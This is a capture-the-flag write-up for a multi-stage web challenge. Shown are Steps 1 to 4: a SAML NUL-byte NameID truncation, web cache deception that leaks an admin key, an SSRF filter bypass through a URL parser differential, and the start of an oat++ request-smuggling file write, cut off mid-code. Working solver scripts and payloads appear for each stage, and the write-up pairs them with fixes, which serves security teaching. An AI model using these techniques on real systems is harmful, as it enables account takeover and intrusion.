# Crownspire Bellworks

Prepared By: `xclow3n`

Challenge Author(s): `xclow3n`

Difficulty: <font color='red'>Insane</font>

<br>

# Synopsis

Crownspire keeps the lower wards in order by cadence, and the Bellworks is where a signal is made lawful before it goes out. You arrive as an anonymous citizen at the public board and leave executing code as the database superuser. The path runs through six locked doors, and every one is the same kind of flaw: a parser or trust-boundary differential, two components that look like they agree on a value and do not.

1. **SAML federation abuse.** A real SimpleSAMLphp identity provider validates a username in PHP, which is binary-safe, but serializes the signed `<NameID>` with libxml2, which is NUL-terminated. A `0x00` byte lets us register a separate account that the Portal signs as an official-domain subject, and a standard Service Provider gives us the `clerk` (bell-scribe) role. The Keeper's seat is not federatable; the assertion only ever reaches bell-scribe.
2. **Web cache deception.** Varnish caches on the literal request path while nginx normalizes it. A bell-scribe files a `/static`-disguised path that resolves to the Keeper-only `/admin/account`. The proctor fetches it, and its authenticated response, which carries the Keeper's sealing key, lands in the shared cache where we read it unauthenticated. We reset the Keeper's passphrase with the stolen key and take the `admin` seat.
3. **SSRF.** The Keeper's Service Runner has a correct resolve-and-pin anti-SSRF filter. We defeat it with a URL parser differential: `urlsplit` and `urllib3` disagree on where the authority ends.
4. **HTTP/1 request smuggling.** A header whose name contains a space desyncs the internal oat++ server, turning a POST into a smuggled `PUT`. That gives an arbitrary file write.
5. **Reverse-proxy config abuse.** We overwrite Traefik's hot-reloaded dynamic config to expose internal Postgres on the public port.
6. **Memory corruption.** A pgcrypto heap overflow (CVE-2026-2005) escalates `ctf_user` to superuser in memory and runs `COPY ... FROM PROGRAM` for RCE, which reads the flag.

Every link in the chain is a parser or trust-boundary differential. The Portal's validator versus its serializer, the cache's key versus the proxy's normalizer, `urlsplit` versus `urllib3`, and oat++'s header parser versus the wire.

## Description

Crownspire is in its last stand. The lower gates are packed with living soldiers, fresh dead, and bodies still moving under Alyss's command. The prior operation opened the oath-work behind her control, but it needs a citywide voice. Her cultists have already prepared that voice for themselves: the bell tower's next ring, one clean cadence to hold the touched inside the Quiet March.

Rin is already in the tower shaft with a brined cord under her coat. Elric found new work hidden under old strike metal. Caldrin has shaped the humanizing breath-key: not a resurrection, but a command-break for those still alive under Alyss's pull and a final rest for the dead already lost. None of that helps if the Bellworks keeps her clean route queued for the emergency ring.

Keir can get one borrowed bell-scribe pass into the desk. From there the job is simple and ugly: get standing, make the Keeper's proctor fetch the wrong inspection, take the Keeper's access, and change the emergency ring before it sounds.

If the bell rings wrong, the puppet-touched wake from Alyss's pull and the true dead are put down cleanly. If it rings clean, the lower wards answer Alyss as one.

## Skills Required

- Web application enumeration and source review
- Understanding of SAML SSO (SP/IdP, signed assertions, the trust boundary)
- HTTP caching and web cache deception (cache keys vs path normalization)
- Reasoning about a multi-layer proxy stack (edge, cache, normalizer, apps)
- HTTP/1.1 internals (keep-alive, request framing, `Content-Length`)
- Basic memory-corruption and heap-exploitation literacy

## Skills Learned

- Validation and serialization differential exploitation in a real IdP (PHP binary-safe validation, libxml2 C-string NameID truncation, sign-after-truncate)
- Web cache deception via a cache-key vs path-normalization confusion (Varnish keys on the literal path; nginx decodes `%2f` and collapses `..`), used against an authenticated bot through a shared cache
- Multi-layer proxy path reasoning: which component sees the literal path, which normalizes it, and which the application authenticates, and how to thread a payload past all three
- SSRF via a URL parser differential that defeats a correct resolve-and-pin filter (numeric and alt-IP evasions and DNS rebinding are all closed)
- HTTP/1 request smuggling through a permissive header-name parser
- Reverse-proxy configuration abuse (Traefik file-provider hot-reload)
- Porting a heap-overflow exploit: deterministic PIE-base resolution via PostgreSQL allocator metadata, in-memory privilege forgery, `COPY FROM PROGRAM` RCE

---

# Application Overview

Visiting the target presents the Crownspire Bellworks, drawn as a bell tower that builds course by course as you scroll. The tower is one static, cacheable page. Your standing is read after load from `GET /api/standing` and decides how high you may climb and which desks open. Signed out, you are a Visitor and can only look at the plaza.

![The Crownspire Bellworks tower, signed out](assets/landing.png)

To enter you present a citizen mark, which sends you to the Citizen Verification Portal, a separate application. Anyone can record a new citizen; new citizens are unverified. The Portal is the realm's single sign-on, and the Bellworks only trusts it to say who a claimant is.

![Recording a citizen at the Verification Portal](assets/register.png)

When you present a mark, the Bellworks redirects you (HTTP 302) to the Portal's identity provider, a stock SimpleSAMLphp install. You authenticate there, and the IdP posts a signed assertion back to the Bellworks.

![Citizen Verification Portal, the identity provider](assets/idp.png)

After authentication you climb into the tower as a `petitioner`, an unverified citizen (Viewer standing). The Viewer hall shows the public notices and nothing else. The Route Inspection desk one floor up is locked and reserved for bell-scribe standing, and the Keeper's floor above it answers to the Keeper alone.

![The Viewer hall: public notices, higher floors locked](assets/viewer.png)

Standing has three rungs, and they do not all come from the same place:

- `petitioner` (Viewer): what any SSO login grants by default.
- `clerk` (bell-scribe): what an `@vaultrune.valyssar.local` subject resolves to in the SP. Self-recording that domain is blocked, so reaching bell-scribe needs the Stage 1 SAML trick. A bell-scribe unlocks File a Route Reference (`/appeals`), which feeds the Keeper's review queue.
- `admin` (Keeper): not an SSO role at all. It is a separate local operator account (`POST /admin/login`, per-boot random sealing key). SSO can never mint it, so we take it over in Stage 2.

### Mapping the architecture

Everything runs in a single container behind one Traefik edge proxy, which is the only exposed port. Downstream of the edge sit a Varnish HTTP cache and an nginx reverse-proxy and normalizer. The shipped configs (`config/traefik/dynamic.yml`, `config/varnish/default.vcl`, `config/nginx/nginx.conf`) show how requests flow:

```
internet -> Traefik (:8080 edge) -> Varnish (:7100, caches on the LITERAL path)
        -> nginx (:7001, decodes %2f + collapses ..) -> { Bellworks, Service Runner, Verification Portal }
```

Traefik forwards everything to the cache; there is no edge IP-ACL. Access to the inner floors is enforced by the application. `/admin/account` returns `403` to any session that is not `admin`. The shipped `config/traefik/dynamic.yml` is a single router that hands the whole path space to Varnish:

```yaml
# config/traefik/dynamic.yml
http:
  routers:
    web:
      rule: "PathPrefix(`/`)"
      entryPoints: ["web"]
      service: cache
  services:
    cache:
      loadBalancer:
        passHostHeader: false
        servers:
          - url: "http://127.0.0.1:7100"
```

| Component | Role | Bind | Reached via |
|---|---|---|---|
| Traefik (file provider, `watch:true`) | public edge proxy and routing; forwards everything to the cache | `:8080` -> host `:1337` | n/a |
| Varnish 6.0.18 | HTTP cache; keys on the literal `req.url` (`passHostHeader:false` gives a constant Host) | `127.0.0.1:7100` | behind Traefik |
| nginx 1.27 | reverse-proxy and normalizer behind Varnish (decodes `%2f`, collapses `..`, also fronts the Portal) | `127.0.0.1:7001` | behind Varnish |
| Bellworks (Node/Express) | SAML SP, tower UI, bell-scribe `/appeals`, and local operator console (`/admin/*`); enforces admin auth | `127.0.0.1:7000` | nginx `/` |
| Citizen Verification Portal (SimpleSAMLphp 2.5.0, PHP-FPM) | SAML IdP; authenticates, signs, and serializes the assertion | `127.0.0.1` (via nginx) | nginx `/sso` |
| Service Runner (Python/Flask) | admin-only egress (SSRF surface) | `127.0.0.1:7002` | nginx `/admin/courier` |
| Proctor bot (`src/apps/bot.py`) | supervised automation; holds the admin session and reviews the bell-scribe queue | loopback only | not routed |
| Inner ward (oat++/C++) | internal record service (file-write surface) | `127.0.0.1:7200` | not routed |
| Postgres 17.7 + pgcrypto | Stage 6 target | `127.0.0.1:5432` | not routed |

Everything over HTTP is reachable from the edge, but the sensitive endpoints are auth-gated by the app. `/admin/account`, `/admin/courier`, and `/internal/*` all require an admin session and answer `403` otherwise. The proctor bot, the inner ward, and Postgres only listen on `127.0.0.1`. The whole challenge is about reaching those loopback-only services, and getting the loopback bot to fetch an authenticated page for us.

Under `supervisord`, every attacker-facing service runs as the low-privileged `app` user (the bot, Service Runner, inner ward, Traefik) or `signet` (Bellworks, nginx, php-fpm). Varnish runs as its own dedicated `varnish` user, so a compromised cache cannot write the files the `app` services own (such as the Traefik config). Postgres runs as `postgres`. Nothing that processes player input runs as root. The flag is root-only and reachable only through a SUID helper. So the objective is:

> viewer -> bell-scribe (SAML) -> Keeper/admin (web cache deception -> sealing key reset) -> loopback-only inner ward -> arbitrary file write -> expose Postgres -> RCE -> SUID `/readflag`.

---

# Step 1: SAML, signing one subject while validating another

## Vulnerability Analysis

The Bellworks is the SAML Service Provider (SP). After login its job is to read the `<NameID>` from the Portal's signed assertion and decide our standing. That decision lives in `src/apps/registry.js`, in the ACS (Assertion Consumer Service) handler:

```js
// src/apps/registry.js  (POST /saml/acs)
const email = String(principal.email).toLowerCase();
db.prepare('INSERT OR IGNORE INTO registry_users(email, role) VALUES (?, ?)').run(email, 'petitioner');

// The federated assertion grants at most 'clerk'. There is no admin branch:
// even a perfectly forged Keeper NameID resolves to clerk here.
const role = canon(email).endsWith(LOCAL_DOMAIN) ? 'clerk' : 'petitioner';   // canon = NFKC + lowercase
```

```js
const LOCAL_DOMAIN = '@vaultrune.valyssar.local';
function canon(value) { return String(value).normalize('NFKC').toLowerCase(); }
```

This is standard SAML SP code: validate the signature (handled by `@node-saml/passport-saml`), then map the NameID's domain to a role. There is no `LIKE`, no `GLOB`, no regex, and no custom XML parsing here, and no path from SAML to admin. The most an assertion can grant is `clerk` (any `@vaultrune.valyssar.local` subject). Admin (the Keeper) is a separate local operator login, covered in Step 2. The SAML differential is how we reach bell-scribe.

So who can mint a `@vaultrune.valyssar.local` NameID? The Bellworks registration desk writes into the Portal's user store, and the IdP authenticates against it. Here is the registration validation:

```js
// src/apps/registry.js
function validateSignup(username, password) {
  if (!username || username.length > 180) return 'Enter a citizen mark (email).';
  if (!username.includes('@'))           return 'Citizen marks must use an email-shaped subject.';
  if (/[<>]/.test(username))             return 'Angle brackets are not allowed in citizen marks.';
  if (canon(username).endsWith(LOCAL_DOMAIN))
    return 'Marks in the vaultrune.valyssar.local register are issued by the Crown, not self-recorded.';
  if (password.length < 4)               return 'Use at least four characters for the passphrase.';
  return '';
}
// ... INSERT INTO users(username, password, display_name); relies on UNIQUE(username)
```

The username is lower-cased, angle brackets are blocked so we cannot inject raw XML, and uniqueness is enforced by the SQLite `UNIQUE(username)` primary key. On top of that, self-recording any `@vaultrune.valyssar.local` subject is blocked: `validateSignup` rejects anything that ends with the official domain after NFKC and lowercase. So we cannot just record `warrant-clerk@vaultrune.valyssar.local` and walk in. That verified row is also pre-seeded at container start with a random, unknowable password (see `config/entrypoint.sh`), so registering the bare name would collide on `UNIQUE` and trip the domain block.

### The differential

The username travels through two parsers that disagree about where a string ends:

- PHP, SimpleSAMLphp, and SQLite are length-aware (binary-safe). A `0x00` (NUL) byte is just another byte. The `sqlauth` module looks the user up with a parameterized query (`config/ssp/authsources.php`):

  ```php
  'query' => 'SELECT username AS uid, display_name AS displayName, password AS pwhash'
           . ' FROM users WHERE username = :username',
  ```

  So a username containing a NUL is stored, found, and password-verified using its full bytes.

- libxml2 (the C library SimpleSAMLphp uses to build and serialize the SAML assertion) is NUL-terminated. When the IdP writes our `uid` into the `<NameID>` text node and serializes the DOM to sign it, libxml2 truncates the string at the first `0x00`.

The assertion is signed after serialization, so the signature is computed over the truncated value.

Now record:

```
warrant-clerk@vaultrune.valyssar.local\x00x
```

- It is byte-distinct from the seeded reserved name, so there is no `UNIQUE` collision.
- It ends in `\x00x`, not in `@vaultrune.valyssar.local`, so `canon(username).endsWith(LOCAL_DOMAIN)` is false and it slips past the domain block. (`canon` lower-cases and NFKC-normalizes but does not strip the NUL, and the trailing `x` is what the suffix test sees.)
- We set our own password on this row, so we can authenticate at the IdP.
- At sign time libxml2 truncates the NameID at the NUL:

```
stored & validated (PHP/SQLite) : warrant-clerk@vaultrune.valyssar.local\x00x
signed <NameID>    (libxml2)    : warrant-clerk@vaultrune.valyssar.local
```

The IdP has validated one subject and signed another. The signed XML contains no NUL bytes, so the SP never sees the trick. `@node-saml/passport-saml` verifies a valid signature over `warrant-clerk@vaultrune.valyssar.local`, that NameID ends with `@vaultrune.valyssar.local`, and the SP's role map gives us `clerk`. The same `canon` is used for the registration block and the role decision, so they can never disagree. The only differential is the IdP-side NUL truncation.

> **Why a character reference does not work (a closed path).** A tempting alternative is to register a subject like `...valyssar.loca&#x6c;` (where `&#x6c;` is `l`) and hope the SP decodes it back to the official domain. It does not work: a real IdP escapes the `&` when it serializes, so the signed NameID is the literal string containing `&#x6c;`. That does not end with `@vaultrune.valyssar.local`, so the SP gives petitioner. Only the `0x00` truncation yields a clean official-domain subject. This is why the challenge uses a real SimpleSAMLphp product instead of a hand-rolled signer: the differential lives in libxml2, not in string concatenation.

## Exploitation

The flow is a normal SP-initiated SSO. The one thing that matters is delivering a genuine `0x00` byte. In Python that is `"\x00"` (a real NUL, which `requests` sends as `%00`), not the raw string `r"\x00"`, which is four literal characters and will not truncate. Express, PHP, and SQLite are all binary-safe, so a real NUL survives end to end. This script is self-contained and prints the bell-scribe session cookie:

```python
#!/usr/bin/env python3
import re, urllib.parse, requests
from html.parser import HTMLParser

BASE = "http://TARGET:1337"
USER = "warrant-clerk@vaultrune.valyssar.local\x00x"   # real 0x00 byte -> sent as %00 (NOT r"\x00")
PW   = "pw1234"

class LoginForm(HTMLParser):
    def __init__(self): super().__init__(); self.forms = []; self._f = None
    def handle_starttag(self, t, a):
        a = dict(a)
        if t == "form": self._f = {"action": a.get("action", ""), "inputs": {}}
        elif t == "input" and self._f is not None and a.get("name"):
            self._f["inputs"][a["name"]] = a.get("value", "")
    def handle_endtag(self, t):
        if t == "form" and self._f is not None: self.forms.append(self._f); self._f = None

def login_form(html):
    p = LoginForm(); p.feed(html)
    return next((f for f in p.forms
                 if {"username", "password"} & set(f["inputs"]) or "AuthState" in f["inputs"]), p.forms[0])

s = requests.Session()
# 1) record the NUL subject (full bytes stored; the 0x00 only truncates later, at the IdP)
s.post(f"{BASE}/signup", data={"email": USER, "displayName": "P", "password": PW})
# 2) SP-initiated SSO: /login 302s to the Portal login form
loc  = s.get(f"{BASE}/login", allow_redirects=False).headers["location"]
page = s.get(urllib.parse.urljoin(BASE, loc), allow_redirects=True)
# 3) authenticate at the IdP as the NUL account (carry the hidden AuthState)
f = login_form(page.text); f["inputs"]["username"] = USER; f["inputs"]["password"] = PW
post = s.post(urllib.parse.urljoin(page.url, f["action"]), data=f["inputs"], allow_redirects=True)
# 4) the IdP auto-POSTs a signed assertion (NameID already truncated by libxml2)
saml = re.search(r'name="SAMLResponse" value="([^"]+)"', post.text).group(1)
rs   = re.search(r'name="RelayState" value="([^"]*)"', post.text)
acs  = s.post(f"{BASE}/saml/acs",
              data={"SAMLResponse": saml, "RelayState": rs.group(1) if rs else "/"},
              allow_redirects=False)
print("[+] bell-scribe session:", acs.headers["set-cookie"].split(";")[0])
# [+] bell-scribe session: registry_session=eyJ...role":"clerk"....<sig>
```

Back in the tower the Route Inspection desk is now open, and `/appeals` accepts a filing:

```
$ curl -s http://TARGET:1337/registry -b "registry_session=..." | grep -o 'File a Route Reference'
File a Route Reference
```

![Bell-scribe standing: the Route Inspection desk unlocked](assets/scribe.png)

We are a bell-scribe, not the Keeper, so `/admin/account` still answers `403` to this session (admin is not federatable). But bell-scribe standing is the foothold we need: the `/appeals` queue is fetched by the Keeper's proctor, and that bot is what Step 2 turns against itself.

**Fix:** reject control characters (including `0x00`) in identifiers before they reach any downstream parser, and prefer a NameID format the SP pins (for example a persistent opaque ID) instead of an attacker-chosen email string mapped to a role by suffix.

---

# Step 2: Web cache deception, stealing the Keeper's sealing key

## Vulnerability Analysis

We are a bell-scribe and need to become the Keeper (admin). Admin is not an SSO role. It is a separate local operator account (`POST /admin/login`) with a per-boot random password seeded into an `operators` table (`config/entrypoint.sh`), so we cannot log in directly. But every operator also has a sealing key (a per-boot random key), and that key is over-scoped:

```js
// src/apps/registry.js  (POST /api/account/reset-password)
const op = db.prepare('SELECT username FROM operators WHERE api_key = ?').get(apiKey);
if (!op) { res.status(403).json({ error: 'forbidden', message: 'Unknown sealing key.' }); return; }
db.prepare('UPDATE operators SET password_hash = ? WHERE username = ?')
  .run(bcrypt.hashSync(newPassword, 10), op.username);          // resets the OWNER's password
```

The sealing key resets the password of the account that owns it, and it is accepted nowhere else as a bearer or session token. So if we can read the Keeper's sealing key, we can reset their password to one we choose and log in. The sealing key is rendered on exactly one page, the authenticated operator account page:

```js
// src/apps/registry.js  (GET /admin/account)
const session = getRegistrySession(req);
if (!session || session.role !== 'admin') {
  res.status(403).type('html').send(renderForbidden('The Keeper account is sealed to the office.', 'Sealed Office', session));
  return;
}
const op = db.prepare('SELECT username, display_name, api_key FROM operators WHERE username = ?')
  .get(session.username || OPERATOR_USERNAME);
res.type('html').send(renderAccount(session, op));   // page contains data-api-key="..."
```

This is the page the proctor renders, and the one the cache will hand us. The sealing key is right there in the markup (`data-api-key="..."`):

![The Keeper Access desk: the sealing key, left cacheable](assets/keeper-key.png)

`/admin/account` is an authenticated endpoint. Without an admin session it returns `403`, and we do not have one. Two facts shape the attack:

- The endpoint is auth-gated, not edge-blocked. There is no edge IP-ACL; Traefik forwards everything to the cache. A remote request to `/admin/account` does reach the app, it just answers `403` because our session is not `admin`. The page only renders for an admin session.
- The page is left cacheable. When it does render (for an admin), `/admin/account` returns `200` with no `Set-Cookie` and no `Cache-Control`. That is the mistake. Whoever fetches it while authenticated, their response can land in the cache. This is the classic web cache deception shape: a static-looking URL that the origin resolves to a dynamic, auth-gated page.

### The cache-key vs normalizer differential

The topology puts a Varnish cache and an nginx normalizer downstream of Traefik:

```
Traefik (:8080, forwards everything) -> Varnish (:7100) -> nginx (:7001) -> Bellworks
```

These two layers disagree about what a path is:

- Varnish caches on the literal `req.url`; it does not normalize. Its misconfiguration is to cache static assets even for logged-in users:

  ```vcl
  # config/varnish/default.vcl
  sub vcl_recv {
      if (req.method == "GET" && req.url ~ "^/static/") { return (hash); }   # cache, even with a Cookie
      return (pass);
  }
  sub vcl_backend_response {
      if (bereq.url ~ "^/static/") { set beresp.ttl = 60s; set beresp.grace = 0s; }
  }
  ```

  It does not unset the `Cookie`, so the upstream still sees the requester's session and authenticates them. Only the cache key is the static-looking URL.

- nginx decodes `%2f` and collapses `..` before it matches a `location`. So a path that starts with `/static/` on the wire can resolve to `/admin/account`, and nginx then proxies a clean URL upstream:

  ```nginx
  # config/nginx/nginx.conf
  location = /admin/account {
      proxy_pass http://registry/admin/account;   # explicit URI -> clean path upstream
      proxy_set_header Cookie $http_cookie;        # forward the requester's session
      ...
  }
  ```

Put them together with this disguised path:

```
/static/<rand>.css/..%2f..%2fadmin/account
```

1. Varnish sees a `^/static/` URL and caches the response under that literal key (and keeps the cookie, so the upstream authenticates).
2. nginx decodes `%2f` to `/` and collapses the `..` segments, so the request resolves to `location = /admin/account` and it proxies a clean `/admin/account` to the Bellworks with the requester's cookie.
3. The Bellworks authenticates the forwarded cookie. For an admin session it returns the `200` sealing key page; for anyone else it returns `403`.

So whoever fetches that path while authenticated gets the sealing key page, and Varnish files it under the harmless `/static/<rand>.css/...` key. If we can get an admin to fetch it, we read the same key unauthenticated and the cache hands us their sealing key.

> `passHostHeader:false` on Traefik's Varnish service pins a constant `Host` downstream, so Varnish's builtin `vcl_hash` (`req.url` plus `Host`) yields the same key for the loopback bot and the remote attacker. The real public host still rides on `X-Forwarded-Host` for SSO URL building.

### The confused deputy: the proctor bot

The admin who will fetch our path is the proctor bot (`src/apps/bot.py`), a supervised service that automates the Keeper's review. It does the following:

1. Logs into the local operator console (`/admin/login`) with the per-boot `ADMIN_PASSWORD` from its environment and holds the admin session cookie.
2. Polls the loopback-only review queue (`GET /internal/queue`, admin-session-gated) for pending bell-scribe references.
3. For each reference, performs one GET through the public edge (`127.0.0.1:8080`) with its admin cookie, sending the path verbatim (`http.client`, so `..%2f` is not normalized away before it hits Varnish).
4. Marks the entry reviewed.

```python
# src/apps/bot.py  (review())
conn = http.client.HTTPConnection("127.0.0.1", EDGE_PORT, timeout=8)   # EDGE_PORT = 8080
conn.putrequest("GET", ref, skip_accept_encoding=True)                 # path sent VERBATIM
conn.putheader("Cookie", cookie)                                       # admin session
conn.putheader("User-Agent", "bellworks-proctor/1.0")
...
resp.read()   # body drained and discarded, never stored or reflected back to us
```

The hardening that closes the would-be unintended paths lives here. The bot fetches only same-origin root-relative paths (one leading `/`, no scheme, no `//host`, no backslash, no whitespace or control bytes), and it never reflects or stores the fetched body. So we cannot make it fetch an off-box URL, and we cannot read the response from the bot. The body only surfaces because Varnish cached it under the key we control.

## Exploitation

We never see the sealing key page directly; we make the cache leak it. As a bell-scribe we file a `/static`-disguised reference, wait for the bot to fetch it (the `/appeals` row flips to `reviewed`), then read the same path unauthenticated for a cache `HIT` and pull `data-api-key` out of the cached admin page. We reset the operator password with that key and log in.

![Filing the /static-disguised reference into the review queue](assets/route-inspection.png)

This script is self-contained. It reaches bell-scribe via Step 1, runs the deception with a fresh filename per attempt, and prints the admin cookie:

```python
#!/usr/bin/env python3
import re, sys, time, secrets, http.client, urllib.parse, requests
from html.parser import HTMLParser

BASE = "http://TARGET:1337"
HOST, PORT = "TARGET", 1337
NUL_USER, PW = "warrant-clerk@vaultrune.valyssar.local\x00x", "pw1234"   # real 0x00 byte

class LoginForm(HTMLParser):
    def __init__(self): super().__init__(); self.forms = []; self._f = None
    def handle_starttag(self, t, a):
        a = dict(a)
        if t == "form": self._f = {"action": a.get("action", ""), "inputs": {}}
        elif t == "input" and self._f is not None and a.get("name"): self._f["inputs"][a["name"]] = a.get("value", "")
    def handle_endtag(self, t):
        if t == "form" and self._f is not None: self.forms.append(self._f); self._f = None

def get_scribe():                                        # Step 1, inline
    s = requests.Session()
    s.post(f"{BASE}/signup", data={"email": NUL_USER, "displayName": "P", "password": PW})
    loc  = s.get(f"{BASE}/login", allow_redirects=False).headers["location"]
    page = s.get(urllib.parse.urljoin(BASE, loc), allow_redirects=True)
    p = LoginForm(); p.feed(page.text)
    f = next((x for x in p.forms if {"username", "password"} & set(x["inputs"]) or "AuthState" in x["inputs"]), p.forms[0])
    f["inputs"]["username"] = NUL_USER; f["inputs"]["password"] = PW
    post = s.post(urllib.parse.urljoin(page.url, f["action"]), data=f["inputs"], allow_redirects=True)
    saml = re.search(r'name="SAMLResponse" value="([^"]+)"', post.text).group(1)
    rs   = re.search(r'name="RelayState" value="([^"]*)"', post.text)
    acs  = s.post(f"{BASE}/saml/acs", data={"SAMLResponse": saml, "RelayState": rs.group(1) if rs else "/"}, allow_redirects=False)
    return acs.headers["set-cookie"].split(";")[0]

def raw_get(path):                                       # path sent VERBATIM (like curl --path-as-is), no cookie
    c = http.client.HTTPConnection(HOST, PORT, timeout=20)
    c.putrequest("GET", path, skip_accept_encoding=True); c.endheaders()
    r = c.getresponse(); body = r.read().decode("utf-8", "replace"); c.close()
    return body

scribe = get_scribe()
api_key = None
for attempt in range(1, 9):
    ref = f"/static/wcd-{secrets.token_hex(6)}.css/..%2f..%2fadmin/account"   # fresh filename avoids self-poison
    requests.post(f"{BASE}/appeals", headers={"cookie": scribe}, data={"reference": ref})   # bell-scribe only
    for _ in range(20):
        time.sleep(2)
        listing = requests.get(f"{BASE}/appeals", headers={"cookie": scribe}).text
        m = re.search(re.escape(ref) + r'.*?pill \w+">(\w+)<', listing, re.S)
        if m and m.group(1) == "reviewed":               # the bot has fetched it; cache now populated
            km = re.search(r'data-api-key="([^"]+)"', raw_get(ref))   # UNAUTH read -> cache HIT
            if km: api_key = km.group(1)
            break
    if api_key: break
    print(f"[*] attempt {attempt}: cache not populated yet, retrying with a fresh filename")
if not api_key: sys.exit("[-] failed to leak the sealing key (is the bot running?)")
print("[+] stolen sealing key:", api_key)

newpw = secrets.token_hex(12)
requests.post(f"{BASE}/api/account/reset-password", json={"api_key": api_key, "new_password": newpw})  # resets the keeper passphrase
lr = requests.post(f"{BASE}/admin/login", data={"username": "warden", "password": newpw}, allow_redirects=False)
print("[+] ADMIN session:", lr.headers["set-cookie"].split(";")[0])
```

> **Self-poison pitfall.** If we GET the path before the bot does, the disguised request reaches the app without an admin session, the app returns `403`, and Varnish caches that `403` under the static-looking key. Every later read then returns the stale `403`. The fix is what the solver does: a fresh random filename per attempt, and read only after the row shows `reviewed`. The `X-Cache: HIT/MISS` header (set in `vcl_deliver`) tells us what landed in the shared cache.

With the new password we log in at `/admin/login` and the session is finally `admin`, Keeper standing. The Service Runner (`/admin/courier`) is now ours, and that is the next surface.

**Fix:** never cache a response that varies by session. Key the cache on the normalized path and on the auth state, or refuse to cache anything carrying a `Cookie`. Mark sensitive pages `Cache-Control: no-store` and `private`. Normalize the path once, at the edge, so the cache key matches the path the application actually authenticates, not a static-looking alias of it.

---

# Step 3: Service Runner SSRF via a URL parser differential

## Vulnerability Analysis

The Service Runner lets the Keeper dispatch a test signal to an external bell-post, which means the server fetches a URL and returns the response. This is a classic SSRF surface.

![The Service Runner: dispatch a POST with address, headers and a parcel, then read the reply](assets/service-runner.png)

But the filter in `src/apps/courier.py` is not the usual broken blocklist. It is the correct defense: resolve the host, reject every non-routable range, and pin the validated IP for the actual request so it cannot re-resolve:

```python
# src/apps/courier.py
def validate_address(raw_address):
    parsed = urlsplit(raw_address)
    if parsed.scheme.lower() not in ALLOWED_SCHEMES:
        raise ValueError("The runner carries only http and https dispatches.")
    host = parsed.hostname
    ...
    infos = socket.getaddrinfo(host, port, proto=socket.IPPROTO_TCP)
    for info in infos:
        ip = ipaddress.ip_address(info[4][0])
        if (ip.is_loopback or ip.is_private or ip.is_link_local
                or ip.is_reserved or ip.is_multicast or ip.is_unspecified):
            raise ValueError("The runner will not ride into Crownspire's sealed wards.")
    return host, infos[0][4][0]          # validated host + the IP to pin

# at dispatch time the validated host is pinned to its validated IP:
vhost, vip = validate_address(address)
real_getaddrinfo = socket.getaddrinfo
def pinned_getaddrinfo(host, *args, **kwargs):
    return real_getaddrinfo(vip if host == vhost else host, *args, **kwargs)
socket.getaddrinfo = pinned_getaddrinfo
record = requests.request("POST", address, ...)     # <-- note: the RAW address string
```

The address comes from the POST JSON body (`dispatch.get("address")`), so only the Keeper (an admin session) can drive it, and only with a real request body. The filter resists the usual tricks. Naive loopback and the common numeric-IP evasions are all rejected:

```
==== naive loopback ====
400 {"error": "sealed", "message": "The runner will not ride into Crownspire's sealed wards."}

==== numeric-IP evasion  http://2130706433:7200/status ====
400 {"error": "sealed", "message": "The runner will not ride into Crownspire's sealed wards."}
```

`2130706433`, `0x7f000001`, `0177.0.0.1`, `127.1`, `localhost`, and `[::1]` all resolve into a non-routable range and are rejected. The IP pinning even closes DNS rebinding: the validated host cannot re-resolve to loopback between check and connect.

### The one flaw it cannot defend

Look again at the last two lines. The filter validates `urlsplit(raw_address).hostname`, but `requests` is then handed the raw address string, and on this stack the two parsers disagree about where the authority ends. It is a parser differential, not a resolution one, so pinning the hostname's IP does nothing: `requests` connects to a different host literal entirely.

The wedge is a backslash:

```
http://127.0.0.1:7200\@1.1.1.1/../status
```

- `urllib.parse.urlsplit` does not treat `\` as a delimiter. The whole `127.0.0.1:7200\` becomes userinfo, and by the last-`@` rule `.hostname` is `1.1.1.1`, a public address that resolves off-box and passes the routable check. (An IP literal needs no DNS, so validation succeeds even on an air-gapped box.)
- `requests` and `urllib3` do treat `\` as an authority terminator. They connect to `127.0.0.1:7200`, percent-encode the backslash into the path, then collapse the `/../` dot-segment, putting `POST /status` on the wire to loopback.

`urlsplit.hostname` is `1.1.1.1`, so validation passes, while the real TCP target is `127.0.0.1:7200`. The runner reaches the loopback-only inner ward.

## Exploitation

This script is self-contained (paste the admin cookie printed by Step 2) and reaches the loopback inner ward:

```python
#!/usr/bin/env python3
import json, requests
BASE  = "http://TARGET:1337"
ADMIN = "registry_session=...   # paste the admin cookie from Step 2"
# urlsplit sees host 1.1.1.1 (passes the filter); requests connects to 127.0.0.1:7200 and collapses /../
addr = r"http://127.0.0.1:7200\@1.1.1.1/../status"
r = requests.post(f"{BASE}/admin/courier",
                  headers={"cookie": ADMIN, "content-type": "application/json"},
                  data=json.dumps({"address": addr}), allow_redirects=False)
print(f"[+] runner -> {r.status_code}\n{r.text.strip()}")
```

```
[+] runner -> 200
office=crownspire-inner-ward
standing=sealed
method=POST
uri=/status
body_len=0
```

`office=crownspire-inner-ward` shows we have reached a service that is not routed from the edge at all. The `/../<path>` tail is general, so we can hit any path on the inner ward. But note the request method: the runner always dispatches `POST`. The interesting endpoint needs a different verb.

**Fix:** never validate one parse of a URL and then act on another. Rebuild the request from the already-parsed and validated components (scheme, host, port, path), or pin the connection at the socket layer to the validated IP and reject any address whose `urlsplit` and request-library interpretations differ.

---

# Step 4: HTTP/1 request smuggling into the inner ward (arbitrary file write)

## Vulnerability Analysis

What lives on the inner ward? `src/internal/inner_ward.cpp`:

```cpp
// src/internal/inner_ward.cpp
if (method == "PUT" && uri.rfind("/records/write", 0) == 0) {
    std::string path = jsonField(body, "path");
    std::string data = b64decode(jsonField(body, "data"));
    std::ofstream out(path, std::ios::binary | std::ios::trunc);
    out << data;                       // arbitrary file write
}
```

`PUT /records/write` writes attacker-supplied bytes to an attacker-supplied path: an arbitrary file write. It is treated as safe because (a) the service only listens on loopback, and (b) the only relay that can reach it, the runner, dispatches POST, never PUT. Stage 3 already broke assumption (a). The verb mismatch is assumption (b), and that is what Stage 4 defeats.

### The oat++ header-name desync

The escape is in oat++'s HTTP/1 header parser (pinned to commit `f83d648`, which is also current oat++ master HEAD, so the bug is present in the latest oat++). A header whose name contains a space silently ends header parsing. Every header after it, including `Content-Length`, is dropped.

With no `Content-Length`, oat++ does not consume the POST body. Those bytes stay on the keep-alive socket and are parsed as the next request. If we make the body a complete `PUT /records/write` request, we have smuggled a PUT through a POST-only relay.

We cannot just put `Content-Length` or `Transfer-Encoding` in our parcel headers; the runner's filter is strict about framing. It normalizes each supplied name two ways (the prefix up to the first whitespace, and the name with all whitespace stripped) and drops it if either matches a framing header:

```python
# src/apps/courier.py
